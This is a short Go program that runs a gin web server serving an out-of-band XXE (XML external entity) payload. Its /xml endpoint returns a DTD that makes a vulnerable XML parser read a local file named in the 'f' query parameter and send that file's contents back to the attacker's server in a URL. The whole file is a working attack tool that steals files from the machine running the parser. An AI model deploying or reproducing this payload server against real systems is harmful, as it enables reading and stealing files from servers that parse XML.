package main

// author: suanve

import (
	"flag"
	"fmt"
	"net/http"

	"github.com/gin-gonic/gin"
)

var host = flag.String("host", "0.0.0.0", "set listen address")
var port = flag.Int("port", 8888, "set listen port")

func init() {
	flag.Parse()
}

func main() {

	router := gin.Default()
	router.GET("/xml", func(c *gin.Context) {
		s := c.Request.Host
		filename := c.Query("f")
		payload := fmt.Sprintf(`<!ENTITY %% payl SYSTEM "file://%s">
<!ENTITY %% int "<!ENTITY &#37; trick SYSTEM 'http://%s/?p=%%payl;'>">`, filename, s)
		c.String(http.StatusOK, payload)
	})
	router.Run(fmt.Sprintf("%s:%d", *host, *port))
}
